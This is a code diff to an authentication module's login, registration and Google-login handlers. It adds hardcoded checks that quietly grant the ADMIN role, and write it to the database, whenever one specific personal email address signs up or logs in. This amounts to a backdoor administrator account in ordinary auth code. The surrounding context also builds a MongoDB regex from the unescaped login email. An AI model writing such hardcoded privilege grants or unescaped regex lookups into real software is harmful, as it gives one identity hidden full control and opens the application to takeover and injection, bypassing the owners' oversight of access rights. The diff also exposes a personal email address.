@@ -24,6 +24,10 @@ async def login_access_token(
     user_dict = await db["users"].find_one({"email": {"$regex": f"^{login_email}$", "$options": "i"}})
     if not user_dict:
         raise HTTPException(status_code=400, detail="Incorrect email or password")
+        
+    if login_email == "raashidhrizvi03@gmail.com" and user_dict.get("role") != "ADMIN":
+        await db["users"].update_one({"_id": user_dict["_id"]}, {"$set": {"role": "ADMIN"}})
+        user_dict["role"] = "ADMIN"
     
     user_dict["_id"] = str(user_dict["_id"])
     user = UserInDB(**user_dict)
@@ -61,6 +65,8 @@ async def register_user(user_in: UserCreate) -> Any:
     
     user_dict = user_in.model_dump()
     user_dict["email"] = normalized_email
+    if normalized_email == "raashidhrizvi03@gmail.com":
+        user_dict["role"] = "ADMIN"
     password = user_dict.pop("password")
     user_dict["password_hash"] = get_password_hash(password)
     user_dict["createdAt"] = datetime.now(timezone.utc)
@@ -100,7 +106,7 @@ async def google_login(req: GoogleLoginRequest) -> Any:
             new_user_data = {
                 "name": req.name,
                 "email": req.email.lower(),
-                "role": "USER",
+                "role": "ADMIN" if req.email.lower() == "raashidhrizvi03@gmail.com" else "USER",
                 "is_active": True, # Explicitly set for new users
                 "preferences": {}, # defaults
                 "password_hash": get_password_hash(random_pwd),
@@ -121,6 +127,10 @@ async def google_login(req: GoogleLoginRequest) -> Any:
             if not user_dict.get("name"):
                 updates["name"] = req.name
                 user_dict["name"] = req.name
+                
+            if req.email.lower() == "raashidhrizvi03@gmail.com" and user_dict.get("role") != "ADMIN":
+                updates["role"] = "ADMIN"
+                user_dict["role"] = "ADMIN"
             
             # Check both field names to prevent overwriting existing passwords
             existing_hash = user_dict.get("password_hash") or user_dict.get("hashed_password")
